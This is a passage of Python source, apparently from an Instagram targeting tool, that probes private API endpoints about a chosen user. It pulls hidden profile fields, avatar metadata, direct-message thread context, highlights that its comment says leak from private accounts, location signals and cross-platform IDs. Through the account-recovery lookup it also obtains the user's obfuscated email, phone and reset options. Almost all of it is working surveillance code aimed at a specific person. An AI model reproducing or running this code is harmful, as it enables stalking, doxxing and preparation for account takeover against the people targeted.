    out['uploader_matches_target'] = (uploader == str(target_pk))
    out['stolen_avatar_signal'] = (uploader != str(target_pk))
    try:
        media_id = int(media_part)
        out['hex'] = hex(media_id)
                                                                      
                                                                            
                                                                             
        ts_ms = (media_id >> 23) + _IG_EPOCH_MS
        out['avatar_uploaded_iso'] = (
            datetime.datetime.fromtimestamp(
                ts_ms / 1000, tz=datetime.timezone.utc).isoformat())
        out['avatar_age_days'] = round(
            (time.time() - ts_ms / 1000) / 86400, 1)
    except (ValueError, TypeError):
        pass
    return out


def _probe_html_ssr(target_username, target_pk, cookies, proxies=None):
    """Public profile HTML SSR probe — TARGET-SCOPED extraction.
    /info/ JSON'da bos donen alanlar (full_name, bio, business contact)
    inline JSON olarak HTML icinde gelebilir. HTML'de baska user objeleri
    de bulunuyor (logged-in viewer, suggestions) — generic regex FP
    uretebilir. Bu yuzden flag/count alanlari SADECE target_pk window'una
    (4KB +/-) scope edilir; yalnizca target-spesifik string alanlar
    (full_name, bio, business_email vs.) global aranir (cunku rare)."""
    h = {
        'user-agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                        'AppleWebKit/537.36 (KHTML, like Gecko) '
                        'Chrome/130.0.0.0 Safari/537.36'),
        'accept': ('text/html,application/xhtml+xml,application/xml;'
                    'q=0.9,*/*;q=0.8'),
        'accept-language': 'en-US,en;q=0.9,tr;q=0.8',
    }
    url = f'https://www.instagram.com/{target_username}/'
    out = {'url': url}
    try:
        r = requests.get(url, headers=h, cookies=cookies,
                          timeout=20, proxies=proxies, allow_redirects=False)
    except requests.exceptions.RequestException as e:
        out['error'] = type(e).__name__
        return out
    out['http_status'] = r.status_code
    out['html_size'] = len(r.text)
    if r.status_code != 200:
        return out
    text = r.text

    OG_PATTERNS = (
        ('og_title', r'<meta\s+property="og:title"\s+content="([^"]+)"'),
        ('og_description',
            r'<meta\s+property="og:description"\s+content="([^"]+)"'),
        ('og_image', r'<meta\s+property="og:image"\s+content="([^"]+)"'),
        ('al_ios_url',
            r'<meta\s+property="al:ios:url"\s+content="([^"]+)"'),
        ('al_android_url',
            r'<meta\s+property="al:android:url"\s+content="([^"]+)"'),
        ('canonical_url',
            r'<link\s+rel="canonical"\s+href="([^"]+)"'),
        ('page_title', r'<title>([^<]{1,300})</title>'),
        ('html_lang', r'<html[^>]+lang="([^"]+)"'),
    )
    for name, pat in OG_PATTERNS:
        m = _re_p33.search(pat, text)
        if m:
            out[name] = m.group(1)

                                                                    
                                                                        
                                                                       
    if '"pageID":"httpErrorPage"' in text:
        out['_html_load_state'] = 'http_error_page (login-wall)'
        out['_extraction_skipped'] = ('JSON content extraction skipped — '
                                        'HTML has no target profile data; '
                                        'only OG/meta tags retained.')
        return out

                                                                          
                                                                    
                                                                     
                       
    scope_text = ''
    pk_str = str(target_pk)
    pk_marker = _re_p33.search(
        rf'"(?:pk|pk_id|id)"\s*:\s*"?{_re_p33.escape(pk_str)}"?', text)
    if pk_marker:
        s = max(0, pk_marker.start() - 6000)
        e = min(len(text), pk_marker.end() + 6000)
        scope_text = text[s:e]
        out['_scope_marker'] = f'pk={pk_str} @ offset {pk_marker.start()}'
    else:
        un_marker = _re_p33.search(
            rf'"username"\s*:\s*"{_re_p33.escape(target_username)}"', text)
        if un_marker:
            s = max(0, un_marker.start() - 6000)
            e = min(len(text), un_marker.end() + 6000)
            scope_text = text[s:e]
            out['_scope_marker'] = (f'username={target_username} '
                                       f'@ offset {un_marker.start()}')
        else:
                                                                          
                                                                          
                                                           
            out['_html_load_state'] = (
                'no_target_marker (HTML has only viewer/suggestion data)')
            out['_extraction_skipped'] = (
                'JSON content extraction skipped — target pk/username not '
                'found in HTML body; generic regex would FP on other users.')
            return out

                                                                 
    SCOPED_PATTERNS = (
        ('full_name', r'"full_name"\s*:\s*"((?:[^"\\]|\\.){1,200})"'),
        ('biography', r'"biography"\s*:\s*"((?:[^"\\]|\\.){1,2000})"'),
        ('category_name', r'"category_name"\s*:\s*"([^"]{1,100})"'),
        ('category', r'"category"\s*:\s*"([^"]{1,100})"'),
        ('business_contact_method',
            r'"business_contact_method"\s*:\s*"([A-Z_]{1,40})"'),
        ('is_business', r'"is_business"\s*:\s*(true|false)'),
        ('is_professional_account',
            r'"is_professional_account"\s*:\s*(true|false)'),
        ('is_verified', r'"is_verified"\s*:\s*(true|false)'),
        ('is_private', r'"is_private"\s*:\s*(true|false)'),
        ('follower_count',
            r'"edge_followed_by"\s*:\s*\{\s*"count"\s*:\s*(\d+)'),
        ('following_count',
            r'"edge_follow"\s*:\s*\{\s*"count"\s*:\s*(\d+)'),
        ('media_count',
            r'"edge_owner_to_timeline_media"\s*:\s*\{\s*"count"\s*:\s*(\d+)'),
    )
    for name, pat in SCOPED_PATTERNS:
        if not scope_text:
            break
        m = _re_p33.search(pat, scope_text)
        if m:
            val = m.group(1)
            if val in ('true', 'false'):
                out[name] = (val == 'true')
            elif val.isdigit():
                out[name] = int(val)
            else:
                out[name] = val

                                                                    
                                                           
    GLOBAL_STRING_PATTERNS = (
        ('business_email', r'"business_email"\s*:\s*"([^"]{1,200})"'),
        ('business_phone_number',
            r'"business_phone_number"\s*:\s*"([^"]{1,30})"'),
        ('public_email', r'"public_email"\s*:\s*"([^"]{1,200})"'),
        ('public_phone_number',
            r'"public_phone_number"\s*:\s*"([^"]{1,30})"'),
        ('public_phone_country_code',
            r'"public_phone_country_code"\s*:\s*"([^"]{1,8})"'),
        ('external_url', r'"external_url"\s*:\s*"([^"]{1,500})"'),
        ('external_lynx_url',
            r'"external_lynx_url"\s*:\s*"([^"]{1,500})"'),
        ('connected_fb_page',
            r'"connected_fb_page"\s*:\s*"([^"]{1,200})"'),
    )
                                                                           
                                                                       
                                     
    for name, pat in GLOBAL_STRING_PATTERNS:
        m = _re_p33.search(pat, scope_text)
        if m:
            out[name] = m.group(1)

    arr = _re_p33.search(
        r'"biography_email_addresses"\s*:\s*\[([^\]]*)\]', scope_text)
    if arr:
        emails = _re_p33.findall(r'"([^"]+)"', arr.group(1))
        if emails:
            out['biography_email_addresses'] = emails
    arr = _re_p33.search(
        r'"biography_phone_numbers"\s*:\s*\[([^\]]*)\]', scope_text)
    if arr:
        phones = _re_p33.findall(r'"([^"]+)"', arr.group(1))
        if phones:
            out['biography_phone_numbers'] = phones

    bio_text = (out.get('biography') or '').encode('utf-8').decode(
        'unicode_escape', errors='ignore')
    if bio_text:
        emails = list(dict.fromkeys(_re_p33.findall(
            r'[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[A-Za-z]{2,}', bio_text)))
        if emails:
            out['bio_emails_extracted'] = emails
        phones = list(dict.fromkeys(_re_p33.findall(
            r'\+\d{1,3}[\s().-]?\d{2,4}[\s().-]?\d{2,4}[\s().-]?\d{0,4}',
            bio_text)))
        if phones:
            out['bio_phones_extracted'] = phones

    od = out.get('og_description') or ''
    m = _re_p33.search(
        r'(\d[\d,\s.]*)\s*Followers?,\s*(\d[\d,\s.]*)\s*Following,'
        r'\s*(\d[\d,\s.]*)\s*Posts?', od, _re_p33.IGNORECASE)
    if m:
        def _n(s):
            return int(_re_p33.sub(r'[^\d]', '', s) or 0)
        out['og_follower_count'] = _n(m.group(1))
        out['og_following_count'] = _n(m.group(2))
        out['og_media_count'] = _n(m.group(3))

    return out


_INFO_BUSINESS_CONTACT_FIELDS = (
    'is_business', 'is_professional_account',
    'professional_conversion_suggested_account_type',
    'business_contact_method', 'category', 'category_name', 'category_id',
    'public_email', 'public_phone_number', 'public_phone_country_code',
    'business_email', 'business_phone_number',
    'biography_email_addresses', 'biography_phone_numbers',
    'biography', 'biography_with_entities',
    'external_url', 'external_lynx_url',
    'connected_fb_page', 'address_street', 'city_id', 'city_name',
    'zip', 'latitude', 'longitude', 'business_address_json',
    'show_account_transparency_details', 'show_post_insights_entry_point',
    'has_eligible_shop_for_business_growth', 'is_eligible_for_lead_center',
    'allow_create_thread_with_recipient',
)


def _extract_info_business_contact(u_info):
    out = {}
    for k in _INFO_BUSINESS_CONTACT_FIELDS:
        if k not in u_info:
            continue
        v = u_info[k]
        if v in (None, '', [], {}, False, 0):
            continue
        out[k] = v
    return out


_HIDDEN_PERSONA_FIELDS = (
                        
    'eimu_id', 'interop_user_type', 'account_type',
    'has_threads_account', 'pronouns', 'gender',
    'account_badges', 'transparency_label', 'transparency_product',
                                 
    'is_meta_verified_subscription_holder',
    'is_eligible_for_meta_verified_account_security_purchase',
    'live_subscription_status', 'subscription_information',
    'creator_subscription_information', 'paid_partnership_status',
    'has_subscription_offers', 'has_active_lead_form',
                       
    'page_id', 'page_id_for_new_suma_biz_account', 'page_name',
    'linked_fb_info', 'fb_page_call_to_action_id',
    'fb_page_call_to_action_label',
                     
    'is_call_to_action_enabled', 'is_potential_business',
    'is_government_official', 'is_charity', 'is_recommended_for_you',
    'feed_post_reshare_disabled', 'reel_auto_archive',
    'allowed_commenter_type', 'enable_smart_replies',
    'request_contact_enabled', 'has_made_announcement_recently',
    'is_questions_enabled', 'is_eligible_for_post_boost_mode',
    'auto_expand_chaining', 'has_chaining', 'has_chaining_inviter_badge',
    'should_show_chaining_inviter_badge',
    'has_unseen_chained_account', 'has_recommend_accounts',
                                  
    'mutual_followers_count', 'total_clips_count', 'total_igtv_videos',
    'usertags_count', 'total_ar_effects', 'has_collab_collections',
    'has_videos', 'mutual_friends_count',
                                                            
    'profile_context', 'profile_context_facepile_users',
    'profile_context_links_with_user_ids', 'social_context',
                    
    'live_with_eligibility',
                          
    'has_eligible_shop_for_business_growth',
    'professional_account_chaining_status',
                
    'remove_message_entrypoint', 'instagram_location_id',
    'is_oce_subdomain_enabled',
    'is_eligible_to_show_fb_cross_share_nux',
    'feed_quick_promo_view_status',
)


def _enumerate_hidden_persona(u_info):
    """u_info'da bulunan ama UI'de gosterilmeyen / sadece bazi context'lerde
    gozuken alanlar. eimu_id ozellikle kritik — encrypted IG messaging
    user ID; uzun vadeli stable identifier."""
    out = {}
    for k in _HIDDEN_PERSONA_FIELDS:
        if k not in u_info:
            continue
        v = u_info[k]
        if v in (None, '', [], {}, False, 0):
            continue
        out[k] = v
    return out


def _enumerate_bio_links(u_info):
    """bio_links — UI'de profil ekraninda 'view all links' tab'i altinda
    gozukur, ama API direk full liste verir (link_id + url + lynx_url +
    title + is_pinned + link_type)."""
    bl = u_info.get('bio_links') or []
    out = []
    for link in bl:
        if not isinstance(link, dict):
            continue
        out.append({
            'link_id': link.get('link_id'),
            'url': link.get('url'),
            'lynx_url': link.get('lynx_url'),
            'title': link.get('title'),
            'link_type': link.get('link_type'),
            'is_pinned': link.get('is_pinned'),
            'is_verified': link.get('is_verified'),
            'open_external_url_with_in_app_browser':
                link.get('open_external_url_with_in_app_browser'),
            'creator_tag_pinned': link.get('creator_tag_pinned'),
        })
    return out


                                                                  
                                                                    
                                                                        
_RESPONSE_HEADER_KEYS_TARGET_CONTEXT = (
    'x-fb-server-cluster',                                              
    'x-fb-debug',                                         
    'x-ig-app-id',                                
    'x-fb-rlafr',                                                             
    'x-fb-trip-id',                                              
    'x-fb-cs',                                            
)
                                                                                
_RESPONSE_HEADER_KEYS_SENSITIVE_REDACT = {
    'ig-set-authorization',                                                    
    'ig-set-ig-u-ds-user-id',                               
    'ig-set-x-mid',                                                             
    'ig-set-ig-u-rur',                                         
    'ig-set-ig-u-shbid', 'ig-set-ig-u-shbts',
    'set-cookie',
}


def _extract_response_header_forensics(headers):
    """Response header'larindan TARGET-CONTEXT signals. ig-set-* header'lari
    cogunlukla VIEWER-SIDE (bizim session rolling state) — bu yuzden hassas
    olanlari redact eder, geri kalan ig-set-*'i ayri 'viewer_context' altinda
    info amacli verir. x-fb-server-cluster target request'in dustugu DC'yi
    soyler — TARGET-CLUSTER context."""
    if not headers:
        return {}
    out = {'target_context': {}, 'viewer_context_non_sensitive': {}}
    lower = {str(k).lower(): str(v) for k, v in dict(headers).items()}
    for k in _RESPONSE_HEADER_KEYS_TARGET_CONTEXT:
        if k in lower:
            out['target_context'][k] = lower[k]
                                                       
    for k, v in lower.items():
        if not k.startswith('ig-set-'):
            continue
        if k in _RESPONSE_HEADER_KEYS_SENSITIVE_REDACT:
            continue
        out['viewer_context_non_sensitive'][k] = v
    out['_note'] = (
        'ig-set-* headers are VIEWER-side rolling state, not target info. '
        'Sensitive viewer identifiers (Bearer token, dsuserid, mid, rur) '
        'are redacted. target_context = headers reflecting target cluster.')
    return out


def probe_about_section_extended(target_pk, cookies, baseline_user_obj=None,
                                    proxies=None):
    """Extended /info/ — about_section + chaining + persistent_actions +
    country_block + high_interest_accounts. UI 'About this account' sayfasi
    bunun sadece ufak bir alt setini gosterir (account creation country/year,
    former usernames). API ek olarak chaining_results (target'in suggestion
    agi), country_block_dialog (banlanmis ulkeler), persistent_actions
    (block/restrict gecmis flag'leri) verir.

    baseline_user_obj verilirse, baseline /info/'da OLMAYAN ama extended
    /info/'da ACILAN field'lari diff_new_fields altinda raporlar — bu
    extra param'lerin gercekten hangi gizli alanlari unlock ettigini
    gosterir."""
    headers = _headers(cookies)
    url = (f'https://i.instagram.com/api/v1/users/{target_pk}/info/'
            f'?from_module=feed_timeline'
            f'&include_about_section=true'
            f'&include_friendship_info=true'
            f'&include_chaining=true'
            f'&include_country_block=true'
            f'&include_persistent_actions=true'
            f'&include_high_interest_accounts=true'
            f'&include_account_age_month=true'
            f'&include_account_dynamic=true')
    out = {'url': url}
    try:
        r = requests.get(url, headers=headers, cookies=cookies,
                          timeout=15, proxies=proxies)
    except requests.exceptions.RequestException as e:
        out['error'] = type(e).__name__
        return out
    out['http_status'] = r.status_code
    if r.status_code != 200:
        out['response_head'] = r.text[:200]
        return out
    try:
        d = r.json()
    except json.JSONDecodeError:
        out['parse_error'] = True
        return out
    u = d.get('user') or {}
    KNOWN_INTERESTING = (
        'about', 'about_section', 'transparency',
        'account_age_month', 'account_creation_country',
        'account_creation_year_month', 'former_usernames',
        'name_changes_count', 'usernames_history',
        'profile_pic_history', 'has_run_ads', 'has_run_political_ads',
        'is_verified_by_meta', 'verified_external',
        'chaining_info', 'chaining_results',
        'country_block_dialog', 'is_blocked_application',
        'persistent_actions', 'high_interest_accounts',
        'transparency_product', 'transparency_label',
        'is_user_dynamic_content_enabled', 'account_dynamic',
        'eimu_id', 'pronouns', 'account_badges', 'account_type',
        'interop_user_type', 'has_threads_account', 'linked_fb_info',
        'page_id', 'page_name', 'mutual_followers_count',
    )
    for k in KNOWN_INTERESTING:
        if k in u:
            out[k] = u[k]
    out['_response_top_keys'] = sorted(d.keys())
    out['_user_obj_field_count'] = len(u)

                                                                             
                                          
    if isinstance(baseline_user_obj, dict):
        baseline_keys = set(baseline_user_obj.keys())
        extended_keys = set(u.keys())
        new_keys = sorted(extended_keys - baseline_keys)
        out['_diff_new_field_count'] = len(new_keys)
        diff_new = {}
        for k in new_keys:
            v = u[k]
            if v in (None, '', [], {}, False, 0):
                continue
            diff_new[k] = v
        out['diff_new_fields_populated'] = diff_new
        out['_diff_new_field_names_all'] = new_keys
    return out


def probe_highlights_tray(target_pk, cookies, proxies=None):
    """Highlights tray — private hesap olsa bile cogu zaman tray data'si
    leak. Highlight basliklari + cover URL'leri + media_count + son media
    timestamp'i (latest_reel_media). UI'de baska bir kullanici bunlari
    sadece highlight'i acarken goruntulu de degil — data API'den."""
    headers = _headers(cookies)
    url = (f'https://i.instagram.com/api/v1/highlights/{target_pk}/'
            f'highlights_tray/')
    out = {'url': url}
    try:
        r = requests.get(url, headers=headers, cookies=cookies,
                          timeout=15, proxies=proxies)
    except requests.exceptions.RequestException as e:
        out['error'] = type(e).__name__
        return out
    out['http_status'] = r.status_code
    if r.status_code != 200:
        out['response_head'] = r.text[:200]
        return out
    try:
        d = r.json()
    except json.JSONDecodeError:
        out['parse_error'] = True
        return out
    trays = d.get('tray') or []
    out['highlight_count'] = len(trays)
    out['highlights'] = []
    for t in trays[:30]:
        cover = t.get('cover_media') or {}
        cover_url = (((cover.get('cropped_image_version') or {}).get('url'))
                       or cover.get('cover_photo_url'))
        item = {
            'id': t.get('id'),
            'title': t.get('title'),
            'media_count': t.get('media_count'),
            'created_at': t.get('created_at'),
            'created_at_iso': _ts_iso(t.get('created_at'), 's'),
            'latest_reel_media': t.get('latest_reel_media'),
            'latest_reel_media_iso':
                _ts_iso(t.get('latest_reel_media'), 's'),
            'cover_url_thumb': cover_url,
            'has_besties_media': t.get('has_besties_media'),
            'has_pride_media': t.get('has_pride_media'),
            'is_pinned_highlight': t.get('is_pinned_highlight'),
            'is_video': t.get('is_video'),
            'pk': t.get('pk'),
        }
        out['highlights'].append(item)
    return out


def _extract_fb_signals(u_info, html_ssr):
    """interop_messaging_user_fbid Meta-internal Messenger interop ID; gercek
    public FB user_id DEGIL — /{interop_id} resolve etmiyor. Bu fonksiyon
    GERCEK FB profile signal'lerini connected_fb_page + facebook.com URL
    scan ile cikarir."""
    out = {
        'interop_id_warning': (
            'interop_messaging_user_fbid is Meta-internal Messenger interop '
            'ID — NOT a public FB user_id; facebook.com/{interop_id} does '
            'not resolve.'),
        'fb_profile_candidates': [],
    }
    seen = set()

    def _add(source, value):
        if not value:
            return
        v = str(value).strip().strip('"').strip("'")
        if v in ('null', 'None', 'false', 'true', '0', ''):
            return
        url = v if v.startswith('http') else f'https://www.facebook.com/{v}'
        key = (source, url)
        if key in seen:
            return
        seen.add(key)
        out['fb_profile_candidates'].append(
            {'source': source, 'value': v, 'url': url})

    _add('info.connected_fb_page', u_info.get('connected_fb_page'))
    if html_ssr:
        _add('html_ssr.connected_fb_page',
              html_ssr.get('connected_fb_page'))

    for src_key in ('external_url', 'external_lynx_url'):
        v = u_info.get(src_key) or ''
        if 'facebook.com' in v or 'fb.com' in v or 'fb.me' in v:
            _add(f'info.{src_key}', v)
        if html_ssr:
            v_h = html_ssr.get(src_key) or ''
            if 'facebook.com' in v_h or 'fb.com' in v_h or 'fb.me' in v_h:
                _add(f'html_ssr.{src_key}', v_h)

    bio_texts = [u_info.get('biography') or '']
    if html_ssr:
        bt = html_ssr.get('biography') or ''
        if bt:
            try:
                bt = bt.encode('utf-8').decode('unicode_escape',
                                                  errors='ignore')
            except Exception:
                pass
            bio_texts.append(bt)
    fb_url_re = _re_p33.compile(
        r'(?:https?://)?(?:www\.|m\.)?(?:facebook\.com|fb\.com|fb\.me)/'
        r'[A-Za-z0-9._\-/?=&%]+', _re_p33.IGNORECASE)
    for bt in bio_texts:
        for u in fb_url_re.findall(bt):
            _add('bio_text_scan', u)

    if not out['fb_profile_candidates']:
        out['result'] = 'no_real_fb_profile_signal'
    else:
        out['result'] = (f'{len(out["fb_profile_candidates"])} candidate(s) '
                          f'from real signals')
    return out


def _extract_geo_signals(u_info, html_ssr, recovery=None):
    """Geographic signals — sadece SERVER-SIDE target-account fields.
    CDN region YOK (viewer-side signal — FP)."""
    out = {'signals': [], 'inferences': []}

    if 'is_in_canada' in u_info:
        v = u_info['is_in_canada']
        out['is_in_canada'] = v
        out['signals'].append(
            f'is_in_canada={v} (server-side target flag)')
        if v is True:
            out['inferences'].append('Target IS in Canada')
    if 'is_in_eu' in u_info:
        v = u_info['is_in_eu']
        out['is_in_eu'] = v
        out['signals'].append(
            f'is_in_eu={v} (server-side target flag)')
        if v is True:
            out['inferences'].append('Target IS in EU (GDPR jurisdiction)')

    pcc = (u_info.get('public_phone_country_code')
            or (html_ssr.get('public_phone_country_code')
                 if html_ssr else None))
    if pcc:
        out['public_phone_country_code'] = str(pcc)
        out['signals'].append(
            f'public_phone_country_code=+{pcc} (target-published)')
        out['inferences'].append(
            f'Phone country code +{pcc} (public/business contact)')

    bpn = (u_info.get('biography_phone_numbers')
            or (html_ssr.get('biography_phone_numbers')
                 if html_ssr else None) or [])
    for ph in bpn:
        m = _re_p33.match(r'\+(\d{1,3})', str(ph))
        if m:
            out['inferences'].append(
                f'Bio phone country prefix +{m.group(1)} ({ph})')

    city = u_info.get('city_name')
    if city:
        out['city_name'] = city
        out['signals'].append(f'city_name="{city}" (target-published)')
        out['inferences'].append(f'City: {city}')
    addr = u_info.get('address_street')
    if addr:
        out['address_street'] = addr
        out['signals'].append('address_street populated')
    lat, lon = u_info.get('latitude'), u_info.get('longitude')
    if lat and lon:
        out['lat_lon'] = [lat, lon]
        out['signals'].append(
            f'business lat/lon={lat},{lon} (target-published)')

    if recovery and recovery.get('lookup_user_country'):
        luc = recovery['lookup_user_country']
        out['lookup_user_country'] = luc
        out['signals'].append(
            f'lookup_user_country={luc} (auth-flow geo, target-side)')
        out['inferences'].append(f'IG lookup country = {luc}')

    if html_ssr and html_ssr.get('html_lang'):
        out['html_lang'] = html_ssr['html_lang']
        out['signals'].append(
            f'html_lang={html_ssr["html_lang"]} (NOTE: viewer locale, '
            f'not target — weak signal)')

    if not out['signals']:
        out['signals'].append(
            'no real target-side geo signal extractable')
    return out


def _decode_xmt_token(threads_glyph_url):
    out = {}
    if not threads_glyph_url or 'xmt=' not in threads_glyph_url:
        return out
    raw = threads_glyph_url.split('xmt=', 1)[1].split('&', 1)[0]
    out['xmt_b64url'] = raw
    pad = raw + '=' * (-len(raw) % 4)
    try:
        import base64
        decoded = base64.urlsafe_b64decode(pad)
        out['xmt_byte_length'] = len(decoded)
        out['xmt_hex'] = decoded.hex()
        if len(decoded) >= 2:
            out['xmt_version'] = f'0x{decoded[0]:02x}'
            out['xmt_flags'] = f'0x{decoded[1]:02x}'
            out['xmt_payload_hex'] = decoded[2:].hex()
    except Exception as e:
        out['xmt_decode_error'] = str(e)
    return out


def probe_friendships_show(target_pk, cookies, proxies=None):
    headers = _headers(cookies)
    url = f'https://i.instagram.com/api/v1/friendships/show/{target_pk}/'
    try:
        r = requests.get(url, headers=headers, cookies=cookies,
                          timeout=15, proxies=proxies)
    except requests.exceptions.RequestException as e:
        return {'error': type(e).__name__}
    if r.status_code != 200:
        return {'http_status': r.status_code,
                 'response_head': r.text[:200]}
    try:
        return r.json()
    except json.JSONDecodeError:
        return {'parse_error': True}


def probe_search_typeahead_user(target_pk, target_username, cookies,
                                   proxies=None):
    headers = _headers(cookies)
    url = (f'https://i.instagram.com/api/v1/fbsearch/topsearch_flat/'
            f'?query={target_username}&context=blended'
            f'&search_surface=top_search')
    try:
        r = requests.get(url, headers=headers, cookies=cookies,
                          timeout=15, proxies=proxies)
    except requests.exceptions.RequestException as e:
        return {'error': type(e).__name__}
    if r.status_code != 200:
        return {'http_status': r.status_code}
    try:
        d = r.json()
    except json.JSONDecodeError:
        return {'parse_error': True}
    items = d.get('list') or []
    for it in items:
        u = it.get('user') or {}
        if str(u.get('pk')) == str(target_pk):
            return u
    return {'not_in_search': True}


def probe_users_lookup_recovery(target_username, cookies, proxies=None):
    headers = _headers(cookies)
    headers['x-csrftoken'] = cookies.get('csrftoken', '')
    headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
    body = (f'signed_body=SIGNATURE.%7B%22q%22%3A%22{target_username}%22%2C'
             f'%22skip_recovery%22%3A%221%22%2C'
             f'%22device_id%22%3A%22android-poc%22%2C'
             f'%22guid%22%3A%2200000000-0000-0000-0000-000000000000%22%2C'
             f'%22directly_sign_in%22%3A%22true%22%7D&ig_sig_key_version=4')
    try:
        r = requests.post('https://i.instagram.com/api/v1/users/lookup/',
                            headers=headers, cookies=cookies, data=body,
                            timeout=15, proxies=proxies)
    except requests.exceptions.RequestException as e:
        return {'error': type(e).__name__}
    out = {'http_status': r.status_code}
    try:
        d = r.json()
    except json.JSONDecodeError:
        out['response_head'] = r.text[:200]
        return out
    if r.status_code == 429:
        out['rate_limited'] = True
        return out
    for k in ('obfuscated_email', 'obfuscated_phone', 'has_valid_phone',
               'can_email_reset', 'can_sms_reset', 'has_whatsapp_installed',
               'fb_login_option', 'is_facebook_only_account',
               'is_instagram_account', 'has_active_facebook_password',
               'has_fb_account_linked', 'gdpr_required',
               'should_show_recovery_options', 'gdpr_consent_required',
               'phone_number', 'username', 'two_factor_required',
               'lookup_user_country', 'eligible_lookup_methods',
               'message', 'status', 'rcg_user_status'):
        if k in d:
            out[k] = d[k]
    if 'account_recovery_options' in d:
        out['account_recovery_options'] = d['account_recovery_options']
    return out


def run_phase33(target_username, target_pk, cookies, proxies=None):
    print(f'[*] Phase 33: TARGET INTERNAL STATE pk={target_pk}')
    intel = {'pk': str(target_pk), 'ts_run': time.time()}
    headers = _headers(cookies)

                                                                          
    info_url = (f'https://i.instagram.com/api/v1/users/{target_pk}/info/'
                  f'?from_module=feed_timeline')
    info_response_headers = {}
    try:
        r0 = requests.get(info_url, headers=headers, cookies=cookies,
                           timeout=15, proxies=proxies)
        u_info = (r0.json().get('user') or {}) if r0.status_code == 200 else {}
        info_response_headers = dict(r0.headers)
    except (requests.exceptions.RequestException, json.JSONDecodeError):
        u_info = {}

                                                    
    print('  [A] friendships/show — 21 viewer<->target internal flag')
    fs = probe_friendships_show(target_pk, cookies, proxies)
    intel['friendships_show'] = fs
    if isinstance(fs, dict) and 'status' in fs:
        rel_flags = {k: v for k, v in fs.items()
                      if k != 'status'}
        for k, v in sorted(rel_flags.items()):
            print(f'      {k:<35} = {v}')
    time.sleep(0.5)

                                              
    print('\n  [B] DM thread context — gizli viewer<->target metadata')
    dm_url = (f'https://www.instagram.com/api/v1/direct_v2/threads/'
                f'get_by_participants/?recipient_users=%5B{target_pk}%5D')
    h_dm = dict(headers)
    h_dm['x-csrftoken'] = cookies.get('csrftoken', '')
    try:
        r = requests.get(dm_url, headers=h_dm, cookies=cookies,
                          timeout=15, proxies=proxies)
        dm_d = r.json() if r.status_code == 200 else {}
    except (requests.exceptions.RequestException, json.JSONDecodeError):
        dm_d = {}
    dm_intel = {}
    for k in ('reachability_statuses', 'should_show_safety_card',
                'has_reached_message_request_limit',
                'is_appointment_booking_enabled',
                'is_viewer_unconnected', 'responsiveness_category',
                'lightweight_intervention_appealable_entity_id',
                'thread_context_items'):
        if k in dm_d:
            dm_intel[k] = dm_d[k]
    target_dm_user = (dm_d.get('users') or [None])[0] or {}
    for k in ('date_joined', 'pinned_channels_info', 'social_context',
                'last_active_status_type'):
        if k in target_dm_user:
            dm_intel[f'target_user.{k}'] = target_dm_user[k]
    intel['dm_thread'] = dm_intel
    for k, v in dm_intel.items():
        if isinstance(v, (list, dict)):
            v = json.dumps(v, ensure_ascii=False, default=str)[:120]
        print(f'      {k:<45} = {v}')
    time.sleep(0.5)

                                            
    print('\n  [C] Search typeahead USER object — /info/\'da olmayan alanlar')
    su = probe_search_typeahead_user(target_pk, target_username, cookies,
                                         proxies)
    SEARCH_NEW_FIELDS = ('should_show_category', 'is_ring_creator',
                          'third_party_downloads_enabled',
                          'is_verified_search_boosted',
                          'has_opt_eligible_shop', 'unseen_count',
                          'show_ring_award', 'is_ring_creator',
                          'fbid_v2', 'profile_pic_id',
                          'show_text_post_app_badge',
                          'show_ig_app_switcher_badge',
                          'has_anonymous_profile_picture')
    search_intel = {k: su[k] for k in SEARCH_NEW_FIELDS if k in su}
    if 'friendship_status' in su:
        search_intel['friendship_status'] = su['friendship_status']
    intel['search_typeahead'] = search_intel
    for k, v in search_intel.items():
        if isinstance(v, (list, dict)):
            v = json.dumps(v, ensure_ascii=False, default=str)[:120]
        print(f'      {k:<40} = {v}')
    time.sleep(0.5)

                                            
                                                                       
                                                                          
                                                                          
                                                                          
    print('\n  [D] Profile pic CDN URL forensics (viewer-side edge + signing)')
    pic_url = (u_info.get('profile_pic_url')
                 or su.get('profile_pic_url') or '')
    cdn = _parse_cdn_url(pic_url)
    cdn['cdn_region_note'] = (
        "VIEWER's nearest Meta CDN edge — NOT the target's location.")
    cdn['stable_content_fingerprint'] = {
        'ig_cache_key': cdn.get('ig_cache_key'),
        '_nc_ohc': cdn.get('_nc_ohc'),
        'note': ('ig_cache_key + _nc_ohc per-istekte sabit; ayni avatar icin '
                  'stable. _nc_oc/_nc_gid/oh her istekte rotate olur.'),
    }
    intel['cdn_forensics'] = cdn
    intel['profile_pic_url'] = pic_url
    for k, v in cdn.items():
        if isinstance(v, dict):
            v = json.dumps(v, ensure_ascii=False, default=str)[:120]
        v_str = str(v)[:120]
        print(f'      {k:<28} = {v_str}')

                                                     
                                                                          
                                                                          
                                                               
    print('\n  [E] Meta IDs (cross-platform identity)')
    fbid_v2 = u_info.get('fbid_v2') or su.get('fbid_v2')
    interop = u_info.get('interop_messaging_user_fbid')
    intel['meta_ids'] = {
        'fbid_v2': fbid_v2,
        'interop_messaging_user_fbid': interop,
        'fbid_v2_is_ig_format': (str(fbid_v2 or '').startswith('17841')),
        'interop_id_note': ('Meta-internal Messenger interop ID, NOT a public '
                              'FB user_id; not directly resolvable.'),
        'threads_url':
            f'https://www.threads.net/@{target_username}',
    }
    print(f'      fbid_v2 (IG-side)              = {fbid_v2}')
    print(f'      interop_messaging_user_fbid    = {interop} '
           f'(Meta-internal, not a public FB user_id)')
    print(f'      threads_url                    = '
           f'{intel["meta_ids"]["threads_url"]}')

                                                                           
    print('\n  [F] profile_pic_id decode (uploader pk + avatar upload ts)')
    ppi_decode = _decode_profile_pic_id(u_info.get('profile_pic_id')
                                            or su.get('profile_pic_id'),
                                            target_pk)
    intel['profile_pic_id_decode'] = ppi_decode
    iso = ppi_decode.get('avatar_uploaded_iso')
    age = ppi_decode.get('avatar_age_days')
    if iso:
        print(f'      LAST AVATAR UPLOADED         -> {iso} '
               f'({age}d ago)')
    for k, v in ppi_decode.items():
        print(f'      {k:<30} = {v}')

                                                
                                                                         
                                                                 
                                                                                
    print('\n  [G] HTML SSR public profile probe (target-scoped)')
    ssr = _probe_html_ssr(target_username, target_pk, cookies, proxies)
    intel['html_ssr'] = ssr
    if ssr.get('error'):
        print(f'      [!] error: {ssr["error"]}')
